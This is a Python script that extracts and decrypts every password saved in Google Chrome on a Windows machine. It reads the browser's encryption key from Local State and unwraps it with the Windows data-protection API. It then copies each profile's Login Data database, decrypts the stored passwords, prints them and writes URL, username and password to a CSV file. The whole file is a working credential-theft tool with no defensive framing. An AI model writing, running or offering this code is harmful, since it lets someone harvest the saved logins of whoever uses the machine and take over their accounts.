import os
import json
import base64
import sqlite3
import subprocess
import csv
from Crypto.Cipher import AES
import win32crypt
import re

class ChromePasswordDecryptor:
    def __init__(self):
        self.chrome_path_local_state = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
        self.chrome_path = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

    def get_secret_key(self):
        try:
            with open(self.chrome_path_local_state, "r", encoding='utf-8') as f:
                local_state = json.load(f)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print(f"[ERR] Chrome secret key cannot be found: {e}")
            return None

    def decrypt_payload(self, cipher, payload):
        try:
            return cipher.decrypt(payload)
        except Exception as e:
            print(f"[ERR] Error decrypting payload: {e}")
            return None

    def generate_cipher(self, aes_key, iv):
        try:
            return AES.new(aes_key, AES.MODE_GCM, iv)
        except Exception as e:
            print(f"[ERR] Error generating cipher: {e}")
            return None

    def decrypt_password(self, ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = self.generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
            return decrypted_pass.decode() if decrypted_pass else ""
        except Exception as e:
            print(f"[ERR] Unable to decrypt: {e}")
            return ""

    def get_db_connection(self, chrome_path_login_db):
        try:
            # Use subprocess to copy the file
            subprocess.run(["copy", chrome_path_login_db, "Loginvault.db"], check=True, shell=True)
            return sqlite3.connect("Loginvault.db")
        except subprocess.CalledProcessError as e:
            print(f"[ERR] Error copying Chrome database: {e}")
            return None

    def extract_passwords(self):
        passwords = []
        try:
            secret_key = self.get_secret_key()
            if not secret_key:
                return "Failed to retrieve secret key."

            folders = [element for element in os.listdir(self.chrome_path) if re.search("^Profile.*|^Default$", element)]
            if not folders:
                print("[ERR] No Chrome user profile found.")
                return passwords

            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (self.chrome_path, folder))
                if not os.path.exists(chrome_path_login_db):
                    print(f"[ERR] Database not found at {chrome_path_login_db}")
                    continue

                conn = self.get_db_connection(chrome_path_login_db)
                if not secret_key or not conn:
                    continue

                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()

                if not rows:
                    print(f"[ERR] No data found in {chrome_path_login_db}")
                else:
                    for index, login in enumerate(rows):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if url and username and ciphertext:
                            decrypted_password = self.decrypt_password(ciphertext, secret_key)
                            print(f"Sequence: {index}")
                            print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'*' * 50}")
                            passwords.append((url, username, decrypted_password))

                cursor.close()
                conn.close()
                os.remove("Loginvault.db")
        except Exception as e:
            print(f"[ERR] {e}")
        return passwords

if __name__ == '__main__':
    decryptor = ChromePasswordDecryptor()
    chrome_passwords = decryptor.extract_passwords()
    if chrome_passwords:
        with open('decrypted_passwords.csv', mode='w', newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            writer.writerow(["URL", "Username", "Password"])
            for url, username, password in chrome_passwords:
                writer.writerow([url, username, password])
